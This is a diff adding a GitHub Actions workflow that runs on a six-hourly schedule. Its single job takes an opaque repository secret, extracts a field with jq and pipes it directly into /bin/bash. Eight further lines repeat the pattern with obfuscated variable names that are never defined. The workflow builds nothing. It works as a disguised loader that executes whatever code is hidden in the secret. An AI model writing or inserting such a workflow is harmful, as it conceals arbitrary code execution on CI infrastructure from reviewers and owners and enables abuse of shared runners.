@@ -1,0 +1,25 @@
+name: ledgerdevilish
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ledgerdevilish
+        env:
+          jqo551: ${{ secrets.jqo551 }}
+        run: |
+          echo $jqo551 | jq -r .smp0147 | /bin/bash
+          echo $lzee038 | jq -r .non79875 | /bin/bash
+          echo $eu634 | jq -r .zgh16 | /bin/bash
+          echo $ripz9 | jq -r .xohvt4 | /bin/bash
+          echo $az134 | jq -r .oohw197 | /bin/bash
+          echo $hwjzc7239 | jq -r .jrk99329 | /bin/bash
+          echo $jm49027 | jq -r .bgi73 | /bin/bash
+          echo $mgf4 | jq -r .z374 | /bin/bash
+          echo $br882 | jq -r .w2936 | /bin/bash
+
